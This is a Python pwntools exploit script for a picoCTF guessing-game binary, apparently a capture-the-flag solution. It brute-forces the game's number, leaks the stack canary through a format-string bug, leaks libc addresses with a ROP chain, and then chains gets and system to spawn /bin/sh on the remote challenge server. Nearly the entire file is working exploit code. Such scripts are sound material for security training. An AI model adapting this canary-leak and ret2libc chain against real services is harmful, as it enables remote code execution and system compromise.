#!/usr/bin/env python3

from pwn import *
from ctypes import c_int32

exe = ELF("./vuln")

try:
    libc = ELF('./libc.so.6')
    ld = ELF('./ld-2.27.so')
except:
    libc = None
    ld = None
    
context.binary = exe


def conn():
    if args.LOCAL:
        r = process([ld.path, exe.path], env={'LD_PRELOAD': libc.path}) 
        if args.GDB:
            gdb.attach(r, gdbscript='file vuln\nb win\nc')
    else:
        r = remote("jupiter.challenges.picoctf.org", 13775)

    return r


def guess_num(r: remote, num: int):
    r.recvuntil(b'What number would you like to guess?\n')
    r.sendline(str(num).encode())
    resp = r.recvline(keepends=False)
    return b'Congrats!' in resp

def bruteforce_ans(r: remote) -> bool:
    for num in range(1, 4097):
        ans = c_int32(num | 0xfffff000).value
        if guess_num(r, ans):
            return ans
    return -1

def leak_canary(r: remote) -> int:
    r.recvuntil(b'Name? ')
    r.sendline(b"%135$x")
    r.recvuntil(b'Congrats: ')
    canary = int(r.recv(8), 16)
    return canary

def leak_libc(r: remote, canary: int):
        
    rop = ROP(exe)
    rop.raw(b'A' * 512) # fill buffer
    rop.raw(p32(canary))
    rop.raw( b'A' * 12) # overwrite saved ebp
    rop.puts(exe.got.printf)    
    rop.puts(exe.got.gets)    
    rop.puts(exe.got.fgets)    
    rop.puts(exe.got.getegid)    
    rop.win() # go back to the win function to continue fucking this thing up
    
    r.recvuntil(b'Name? ')
    r.sendline(rop.chain())
    r.recvuntil(b"Congrats: ")
    
    r.recvuntil(b'\n\n')

    printf = u32(r.recvline()[:4])
    gets = hex(u32(r.recvline()[:4]))
    fgets = hex(u32(r.recvline()[:4]))
    getegid = hex(u32(r.recvline()[:4]))
    info(f"leaked {hex(printf) = }")
    info(f"leaked {gets = }")
    info(f"leaked {fgets = }")
    info(f"leaked {getegid = }")
    
    return printf

def drop_shell(r: remote, canary: int):
    BIN_SH_ADDR = 0x804a000 # an address in .data to which im gonna yoink the /bin/sh\x00
    
    r.recvuntil(b'Name? ')
    
    rop = ROP(exe)
    rop.raw(b'A' * 512) # fill buffer
    rop.raw(p32(canary))
    rop.raw( b'A' * 12) # overwrite saved ebp
    rop.gets(BIN_SH_ADDR)
    rop.call(libc.sym.system, [BIN_SH_ADDR])
    
    r.sendline(rop.chain())
    r.sendline(b"/bin/sh\x00")
    print("enjoy shell")
def main():
    r = conn()
    
    
    # get_random returns a constant number (address of function rand)
    # and do_stuff limits it to a range between 1 and 4096.
    # tho in the assembly this limitation works weird so 
    # for some reason the result of this range gets ORed with 0xfffff000
    # so well do that
    # therefore we are able to bruteforce random
    # to get to the desired win function that will give us
    # a bof and format strings vulnurabilities
    ans = bruteforce_ans(r)
    if ans == -1:
        error('brute force failed for some weird reason.')
    info("ans is: " + str(ans))
    # now we'll use the format strings vulnurability to leak the canary
    
    canary = leak_canary(r)
    info("canary is: " + hex(canary))

    guess_num(r, ans) # go back to win


    # leak some libc addresses to find what libc version the program uses
    # do this once get the libc from https://libc.rip/
    # and then comment this out and uncomment the next section
    
    printf_leak = leak_libc(r, canary)

    if not libc:
        error("use leaked info to get libc, ld, and patch the binary to use them")

    libc.address = printf_leak - libc.sym.printf
    info(f"libc base address: " + hex(libc.address))


    drop_shell(r, canary)

    r.interactive()


if __name__ == "__main__":
    main()
